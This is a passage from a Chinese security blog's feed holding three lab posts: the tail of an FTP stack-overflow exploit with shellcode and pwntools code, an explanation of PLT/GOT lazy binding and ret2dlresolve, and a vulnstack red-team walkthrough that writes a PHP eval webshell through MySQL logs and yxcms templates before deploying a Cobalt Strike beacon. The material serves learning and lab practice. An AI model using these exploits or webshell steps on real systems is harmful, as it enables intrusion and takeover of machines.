class="string">b&quot;\x1d\x97\x76\x55\xcb\x05\x20\xcf\xe9\xd7\xb4\x28\xa9&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x03\x05\xb6\x30\xc1\x31\x9c\x22\x1f\xb9\x98\x16\xcf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xec\x76\xc0\xa9\x46\x39\xba\x63\x34\x93\x2a\xf5\x76&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x24\x2c\xfa\x52\xd2\xd0\x4b\x0b\xa3\xef\x64\xdb\x23&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x88\x98\x7b\xcb\x43\x19\x8b\x86\xc9\x08\x04\x4f\x98&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x08\x49\x70\x77\x4e\x74\xf3\x7d\x2f\x83\xeb\xf4\x2a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xcf\xab\xe5\x46\x40\x5e\x09\xf4\x61\x4b&quot;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;192.168.112.146&quot;</span>, <span class="number">21</span>)</span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br><span class="line">payload = flat(<span class="string">&quot;USER &quot;</span>, cyclic(<span class="number">2000</span>), <span class="number">0x77f8b227</span>, buf)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br></pre></td></tr></table></figure>

<p>在攻击机发送exploit，连接靶机4444端口成功</p>
<img src="https://i.loli.net/2021/04/12/ezcg1ImONitk2py.png" alt="image-20210412235850462" style="zoom:80%;" />

<h2 id="五、参考文献"><a href="#五、参考文献" class="headerlink" title="五、参考文献"></a>五、参考文献</h2><ul>
<li><a href="https://www.exploit-db.com/exploits/26471">https://www.exploit-db.com/exploits/26471</a></li>
<li><a href="https://www.cnblogs.com/cnsec/p/13286514.html">https://www.cnblogs.com/cnsec/p/13286514.html</a></li>
</ul>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>动态链接-ret2dlresolve</title>
    <url>/2021/05/18/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5-ret2dlresolve/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复习一下动态链接的全过程，通过plt和got的延迟绑定详细过程，彻底理解了ret2dlresolve</p>
<span id="more"></span>

<h1 id="链接器"><a href="#链接器" class="headerlink" title="链接器"></a>链接器</h1><p>链接器作用：符号解析和重定位</p>
<ol>
<li>符号解析：将可重定位目标文件里的的符号引用对应符号表里一个确定的符号定义相关联，符号定义以符号表的形式存储在对象文件，完成了符号解析，就能够确定每个符号的位置，完成了符号解析，就能够确定每个符号的位置</li>
<li>重定位：<ul>
<li>重定位节和符号定义：将所有同类的节合并成一个聚合节，并赋予聚合节以及每个定义的符号生成可执行文件最终运行时内存地址。这一步完成，每条指令和符号都有了唯一的运行时内存地址</li>
<li>重定位符号引用：链接器修改节和数据节中对每个符号的引用，使其指向正确的运行时地址。为了确定每个节中需要修改的符号引用地址，需要参考重定位条目</li>
</ul>
</li>
</ol>
<h1 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h1><p>动态链接分为隐式链接和显式链接</p>
<img src="https://i.loli.net/2021/05/18/YOFJqmD3vdfkrBw.png" style="zoom:80%;" />

<ul>
<li><p>load-time dynamic linking(加载时动态链接，隐式链接)</p>
</li>
<li><ul>
<li>指程序载入内存时加载所需的动态链接库</li>
<li>当创建可执行文件的时候，只链接一些重定位和符号表信息，使程序运行时可解析共享库。可执行文件加载时才由动态链接器真正完成动态链接过程</li>
</ul>
</li>
<li><p>run-time dynamic linking(运行时动态链接，显式链接)</p>
<ul>
<li><p>动态链接库不随程序加载进内存，只在程序运行时调用相关的API而载入或释放</p>
</li>
<li><p>应用程序可能再他运行时要求加载和链接某个共享库，而无需再编译时链接到应用中</p>
</li>
</ul>
</li>
</ul>
<p>当共享库装载进内存时，动态链接器重定位共享库，并修改可执行文件中的GOT（延迟绑定），需要用到两个表PLT和GOT</p>
<h1 id="PLT和GOT"><a href="#PLT和GOT" class="headerlink" title="PLT和GOT"></a>PLT和GOT</h1><ul>
<li>PLT过程链接表，是一个由0x10大小条目组成的数组，<strong>每个条目负责调用一个具体的函数</strong>。从plt[1]开始的条目负责调用代码里共享库函数。plt[0]比较特殊，跳转到动态链接器装载函数实际地址到got表</li>
<li>got全局偏移表，GOT是一个<strong>保存函数实际地址数组</strong>，从GOT[3]开始每项为内存中函数的实际地址。GOT[0]和GOT[1]是动态链接器解析函数地址时使用的信息，GOT[2]是动态链接器入口点<ul>
<li>got[0]：可执行文件.dynamic地址</li>
<li>got[1]：link_map结构地址</li>
<li>got[2]：动态链接器_dl_runtime_resolve()地址</li>
</ul>
</li>
</ul>
<p>除去PLT和GOT里特殊的表项，PLT与GOT每个表项都一一对应，为同一个函数服务</p>
<img src="https://i.loli.net/2021/05/18/XCAMFiDcbsmY6GN.png" style="zoom:80%;" />

<p>当程序调用一个共享库的函数时，需要在程序真正运行时才解析函数的实际地址。在可执行文件里调用的函数地址为plt表项的地址，plt在运行时解析函数地址并装载进got表之后，跳转到got表执行。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">080483d0 &lt;.text&gt;:</span><br><span class="line"> ···</span><br><span class="line"> 80484a9:	8d 45 94             	lea    -0x6c(%ebp),%eax</span><br><span class="line"> 80484ac:	89 44 24 04          	mov    %eax,0x4(%esp)</span><br><span class="line"> 80484b0:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</span><br><span class="line"> 80484b7:	e8 d4 fe ff ff       	call   8048390 &lt;read@plt&gt;</span><br><span class="line"> 80484bc:	c9                   	leave  </span><br><span class="line"> 80484bd:	c3                   	ret  </span><br></pre></td></tr></table></figure>

<p>plt每个plt条目大小为0x10，首条指令为跳转到对应的got表项地址，got表里的地址为函数在内存中的真正地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">08048380 &lt;setbuf@plt&gt;:</span><br><span class="line"> 8048380:	ff 25 00 a0 04 08    	jmp    *0x804a000</span><br><span class="line"> 8048386:	68 00 00 00 00       	push   $0x0</span><br><span class="line"> 804838b:	e9 e0 ff ff ff       	jmp    8048370 &lt;setbuf@plt-0x10&gt;</span><br><span class="line"></span><br><span class="line">08048390 &lt;read@plt&gt;:</span><br><span class="line"> 8048390:	ff 25 04 a0 04 08    	jmp    *0x804a004</span><br><span class="line"> 8048396:	68 08 00 00 00       	push   $0x8</span><br><span class="line"> 804839b:	e9 d0 ff ff ff       	jmp    8048370 &lt;setbuf@plt-0x10&gt;</span><br></pre></td></tr></table></figure>

<p>在read@plt地址0x8048390下断点，运行程序，程序跳转到<a href="mailto:&#114;&#x65;&#x61;&#x64;&#x40;&#103;&#x6f;&#x74;&#x2e;&#112;&#108;&#x74;">&#114;&#x65;&#x61;&#x64;&#x40;&#103;&#x6f;&#x74;&#x2e;&#112;&#108;&#x74;</a>地址。</p>
<ul>
<li>由于是第一次调用read函数，got表里并没有填充read函数的真实地址，需要调用解析函数解析实际地址填充到got表里，而这个解析函数就由plt[0]调用，所以程序跳转回自己的plt表第二条指令</li>
<li>0x08048396将read函数自身在.rel.plt表的偏移压栈（实际是偏移*8），作为解析函数的参数，随后跳转到plt[0]-0x8048370</li>
<li>plt[0] 第一条指令0x8048370将 GOT[1]压栈，GOT[1]中存放了指向read()的 link_map 结构的偏移地址</li>
<li>plt[0]第二条指令0x8048376跳转到GOT[2]存放的地址，该地址指向动态链接器的&lt;_dl_runtime_resolve&gt;函数，确定read()的地址，重写read的GOT表</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">─────────────────────────────────────[ DISASM]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0x8048390</span>  &lt;read@plt&gt;              jmp    dword ptr [read@got.plt] &lt;<span class="number">0x804a004</span>&gt;</span><br><span class="line">   <span class="number">0x8048396</span>  &lt;read@plt+<span class="number">6</span>&gt;            push   <span class="number">8</span></span><br><span class="line">   <span class="number">0x804839b</span>  &lt;read@plt+<span class="number">11</span>&gt;           jmp    <span class="number">0x8048370</span> &lt;<span class="number">0x8048370</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x8048370</span>  &lt;plt[<span class="number">0</span>]&gt;                push   dword ptr [<span class="number">0x8049ff8</span>]</span><br><span class="line">   <span class="number">0x8048376</span>                          jmp    dword ptr [<span class="number">0x8049ffc</span>] &lt;_dl_runtime_resolve&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0xf7fee000</span> &lt;_dl_runtime_resolve&gt;   push   eax</span><br><span class="line">   <span class="number">0xf7fee000</span> &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">   <span class="number">0xf7fee001</span> &lt;_dl_runtime_resolve+<span class="number">1</span>&gt;     push   ecx</span><br><span class="line">   <span class="number">0xf7fee002</span> &lt;_dl_runtime_resolve+<span class="number">2</span>&gt;     push   edx</span><br><span class="line">   <span class="number">0xf7fee003</span> &lt;_dl_runtime_resolve+<span class="number">3</span>&gt;     mov    edx, dword ptr [esp + <span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0xf7fee007</span> &lt;_dl_runtime_resolve+<span class="number">7</span>&gt;     mov    eax, dword ptr [esp + <span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0xf7fee00b</span> &lt;_dl_runtime_resolve+<span class="number">11</span>&gt;    call   _dl_fixup &lt;_dl_fixup&gt;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; plt</span><br><span class="line"><span class="number">0x8048380</span>: setbuf@plt</span><br><span class="line"><span class="number">0x8048390</span>: read@plt</span><br><span class="line"><span class="number">0x80483a0</span>: __gmon_start__@plt</span><br><span class="line"><span class="number">0x80483b0</span>: __libc_start_main@plt</span><br><span class="line"><span class="number">0x80483c0</span>: write@plt</span><br><span class="line">pwndbg&gt; got</span><br><span class="line">GOT protection: Partial RELRO | GOT functions: <span class="number">5</span></span><br><span class="line">[0x804a000] setbuf@GLIBC_2.0 -&gt; 0xf7e69000 (setbuf) </span><br><span class="line">[0x804a004] read@GLIBC_2.0 -&gt; 0x8048396 (read@plt+6)</span><br><span class="line">[0x804a008] __gmon_start__ -&gt; 0x80483a6 (__gmon_start__@plt+6)</span><br><span class="line">[0x804a00c] __libc_start_main@GLIBC_2.0 -&gt; 0xf7e1b550 (__libc_start_main)</span><br><span class="line">[0x804a010] write@GLIBC_2.0 -&gt; 0xf7ed8c90 (write)</span><br></pre></td></tr></table></figure>

<h1 id="动态链接数据结构"><a href="#动态链接数据结构" class="headerlink" title="动态链接数据结构"></a>动态链接数据结构</h1><h2 id="动态段-dynamic"><a href="#动态段-dynamic" class="headerlink" title="动态段 .dynamic"></a>动态段 .dynamic</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>

<p>动态链接器通过d_tag识别动态段信息，动态链接器映射到内存中，首先会对自身重定位，接着会查询ELF可执行文件的.dynamic节DT_NEEDED条目，链接所需的共享库。当一个共享库被装载进内存，链接器会获取动态段信息，并将库信息添加到link_map链表中，Link_map是动态链接器的内部结构，用于跟踪加载的库和库中的符号。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;		<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;		<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>
<h2 id="重定位表-rel-plt"><a href="#重定位表-rel-plt" class="headerlink" title="重定位表.rel_plt"></a>重定位表.rel_plt</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(val)		((val) &gt;&gt; 8)</span></span><br></pre></td></tr></table></figure>

<p>r_offset是需要重定位的引用地址，r_info指定必须对其重定位的符号表索引和重定位类型，符号表索引等于r_info&gt;&gt;8，.got.plt重定位类型是R_386_JUMP_SLOT，表示被修正的位置只需要直接填入符号地址即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> readelf -r pwn-200</span> </span><br><span class="line"></span><br><span class="line">重定位节 &#x27;.rel.plt&#x27; 位于偏移量 0x318 含有 5 个条目：</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">0804a000  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0</span><br><span class="line">0804a004  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0</span><br><span class="line">0804a008  00000307 R_386_JUMP_SLOT   00000000   __gmon_start__</span><br><span class="line">0804a00c  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a010  00000507 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br></pre></td></tr></table></figure>

<h2 id="符号表-dynsym"><a href="#符号表-dynsym" class="headerlink" title="符号表.dynsym"></a>符号表.dynsym</h2><p>用于符号解析的符号表</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>

<p>st_name 是字符串表中的偏移</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> readelf -s pwn-200</span></span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.dynsym&#x27; contains 9 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@GLIBC_2.0 (2)</span><br><span class="line">     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)</span><br><span class="line">     3: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)</span><br><span class="line">     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.0 (2)</span><br><span class="line">     6: 0804a040     4 OBJECT  GLOBAL DEFAULT   25 stdout@GLIBC_2.0 (2)</span><br><span class="line">     7: 0804863c     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used</span><br><span class="line">     8: 0804a020     4 OBJECT  GLOBAL DEFAULT   25 stdin@GLIBC_2.0 (2)</span><br></pre></td></tr></table></figure>

<h3 id="dl-runtime-resolve-解析"><a href="#dl-runtime-resolve-解析" class="headerlink" title="_dl_runtime_resolve()解析"></a>_dl_runtime_resolve()解析</h3><p>_dl_runtime_resolve()内部调用了 _dl_fixup() 函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//源码里的部分语句</span></span><br><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">｛</span><br><span class="line">    <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">｝</span><br></pre></td></tr></table></figure>

<p>源码解析：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure>
<p>参数与_dl_runtime_resolve()相同，reloc_arg是函数在.rel.plt里的偏移，与.got.plt表的偏移一致</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br></pre></td></tr></table></figure>

<p>获取重定位条目，DT_JMPREL保存指向.rel.plt的地址，reloc_offset即重定位表偏移</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure>

<p>reloc-&gt;r_info从重定位条目的r_info获取重定位符号表的偏移，进而在符号表里查询符号</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>

<p>确定重定位类型是R_386_JUMP_SLOT，随后根据符号表的信息，去字符串表查找对应字符串</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br></pre></td></tr></table></figure>

<p>调用DL_FIXUP_MAKE_VALUE函数获取函数的的实际地址，将函数地址写到got表对应位置</p>
<p>总结：link_map访问.dynamic，先后获取.rel.plt重定位条目，.dynsym符号表索引，.dynstr函数对应的字符串，最后从动态链接库中查找函数的地址，更新got表，调用这个函数</p>
<h1 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h1><p>RELRO (RELocation Read Only)只读重定位，分为 partial relro 和 full relro</p>
<ul>
<li><p>Partial RELRO</p>
<ul>
<li>一些节在被动态链接器初始化后标记为只读，包括.init_array .fini_array .jcr .dynamic .got </li>
<li>.got.plt仍然可写</li>
</ul>
</li>
<li><p>Full RELRO</p>
<ul>
<li>拥有 Partial RELRO 的所有特性</li>
<li>延迟绑定被禁用，所有导入符号在链接的时候就被解析</li>
<li>整个GOT也被（重新）映射为只读，.got.plt节完全用目标函数的最终地址（将.got和.got.plt合并到一个节.got中）进行了初始化</li>
<li>由于未启用惰性解析，因此不会初始化GOT [1]和GOT [2]条目。</li>
</ul>
</li>
</ul>
<h1 id="攻击-dl-runtime-resolve"><a href="#攻击-dl-runtime-resolve" class="headerlink" title="攻击_dl_runtime_resolve()"></a>攻击_dl_runtime_resolve()</h1><p>没有开启RELRO，.dynamic可写，将.dynamic中dynstr指针篡改为一个伪造的fake_dynstr表，在伪造的字符串表中将调用的函数字符串（如read）改为system字符串。_dl_runtime_resolve()回根据获得的字符串作为函数名去查找函数。</p>
<p>开启Partial RELRO，.dynamic不可写。由于_dl_runtime_resolve的第二个参数重定位偏移没有检查数组越界，利用这一点将重定位偏移改成一个很大的数，使其偏移bss节，在bss节伪造的重定位条目，那么 _dl_runtime_resolve将被欺骗，进而去伪造的重定位条目查询我们想要的system函数。进而伪造system符号信息和字符串信息，最后调用system函数。</p>
<p>Full RELRO绕过：<a href="https://darkwing.moe/2019/05/10/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B015-Full-RELRO%E4%B8%8Elibrary/">https://darkwing.moe/2019/05/10/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B015-Full-RELRO%E4%B8%8Elibrary/</a></p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ul>
<li><p>《深入理解计算机系统》</p>
</li>
<li><p>《linux二进制分析》</p>
</li>
<li><p><a href="https://www.jianshu.com/p/cdb5cfcb5056">https://www.jianshu.com/p/cdb5cfcb5056</a></p>
</li>
<li><p><a href="https://www.freebuf.com/articles/system/170661.html">https://www.freebuf.com/articles/system/170661.html</a></p>
</li>
<li><p><a href="https://zhuanlan.zhihu.com/p/37572651">https://zhuanlan.zhihu.com/p/37572651</a></p>
</li>
<li><p><a href="https://ctf-wiki.org/pwn/linux/stackoverflow/advanced-rop/ret2dlresolve">https://ctf-wiki.org/pwn/linux/stackoverflow/advanced-rop/ret2dlresolve</a></p>
</li>
<li><p><a href="https://xz.aliyun.com/t/5111">https://xz.aliyun.com/t/5111</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ROP</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack-ATT&amp;CK红队实战靶场一</title>
    <url>/2021/08/18/vulnstack-ATT&amp;CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%B8%80/</url>
    <content><![CDATA[<h1 id="vulnstack-ATT-amp-CK红队实战靶场一"><a href="#vulnstack-ATT-amp-CK红队实战靶场一" class="headerlink" title="vulnstack-ATT&amp;CK红队实战靶场一"></a>vulnstack-ATT&amp;CK红队实战靶场一</h1><p>红日安全团队分享的实战靶机一下载地址<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
<span id="more"></span>

<h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><img src="https://i.loli.net/2021/08/18/g9sc834BIz7maY5.png"  style="zoom:80%;" />

<ul>
<li>攻击机kali：外网192.168.112.132</li>
<li>win7：内网192.168.176.143 外网192.168.112.164</li>
<li>win2003：内网192.168.176.141</li>
<li>win2008：内网192.168.176.138</li>
</ul>
<p>确保同网段主机相互ping通，win7作为webserver开启phpstudy</p>
<h2 id="二、web攻击"><a href="#二、web攻击" class="headerlink" title="二、web攻击"></a>二、web攻击</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>用nmap探测同网段的目标</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -sP 192.168.112.0/24</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/08/18/pYE8vfLImN3WdiT.png"  style="zoom:80%;" />

<p>扫描到目标主机192.168.112.164，继续nmap探测</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.112.164</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/08/18/PydfWIgxK73MNUR.png"  style="zoom:80%;" />

<p>dirsearch扫描站点目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.112.164</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/08/18/QCNXta73jpdwleY.png" style="zoom:80%;" />

<p>发现有phpmyadmin后台管理和网站备份文件</p>
<h3 id="mysql数据库getshell"><a href="#mysql数据库getshell" class="headerlink" title="mysql数据库getshell"></a>mysql数据库getshell</h3><p>从phpstudy探针获取站点的绝对路径</p>
<img src="https://i.loli.net/2021/08/18/ofOZjeuJK2HMPbF.png" style="zoom: 80%;" />

<p>弱口令root-root进入phpmyadmin后台，通过后台上传webshell，首先查看mysql用户权限</p>
<img src="https://i.loli.net/2021/08/18/x7B8vklsdhnIPfR.png"  style="zoom:80%;" />

<p>执行命令查看secure_file_priv</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> &quot;secure_file_priv&quot;</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/08/18/By1Sh9zbNc4UWeQ.png"  style="zoom:80%;" />

<p>secure_file_priv为NULL无法进行文件写入，使用SELECT INTO OUTFILE方法无效，方法二，使用日志上传webshell</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%general%&#x27;</span></span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/08/18/WrVnmXY4SxKZ5yD.png" style="zoom:80%;" />

<p>打开日志功能，将日志文件更改为可连接的路径c:/phpstudy/WWW/webshell.php</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>;	#打开日志写入功能</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;c:/phpstudy/WWW/webshell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/08/18/TS4GtiW6aNrxcI2.png" style="zoom:80%;" />

<p>向日志中写入webshell，并用菜刀连接</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;&lt;?php @eval($_GET[&#x27;cmd&#x27;]);?&gt;&quot;;</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/08/18/aetd7k9hiEIFNu2.png"  style="zoom:80%;" />

<h3 id="通过yxcms-getshell"><a href="#通过yxcms-getshell" class="headerlink" title="通过yxcms getshell"></a>通过yxcms getshell</h3><p>在路径扫描时发现网站备份文件beifen.rar，从中获取信息，进入网站<a href="http://192.168.112.164/yxcms/%EF%BC%8C%E5%9C%A8%E4%B8%BB%E9%A1%B5%E9%9D%A2%E6%89%BE%E5%88%B0%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%EF%BC%8C%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0">http://192.168.112.164/yxcms/，在主页面找到网站后台相关信息，进入后台</a></p>
<img src="https://i.loli.net/2021/08/18/SVXGdFi81gtq5pa.png" style="zoom:80%;" />

<p>在前台模板发现能够创建和编辑页面，创建一个一句话木马的php文件</p>
<img src="https://i.loli.net/2021/08/18/HBmEwLVfjpQkXAR.png" style="zoom:80%;" />

<p>访问创建的php木马，路径从备份文件中搜索，<a href="http://192.168.112.164/yxcms/protected/apps/default/view/default/new_shell.php%EF%BC%8C%E8%8F%9C%E5%88%80%E8%BF%9E%E6%8E%A5%E5%8D%B3%E5%8F%AF">http://192.168.112.164/yxcms/protected/apps/default/view/default/new_shell.php，菜刀连接即可</a></p>
<h2 id="三、内网渗透"><a href="#三、内网渗透" class="headerlink" title="三、内网渗透"></a>三、内网渗透</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>webshell上传cs生成的木马，在命令行运行木马</p>
<img src="https://i.loli.net/2021/08/18/HO8isU1g3LVflAn.png" style="zoom:80%;" />

<p>目标在cs上线</p>
<img src="https://i.loli.net/2021/08/18/SE5NOUu3KkRtpdI.png" style="zoom:80%;" />

<p>依次执行以下命令，获取信息</p>
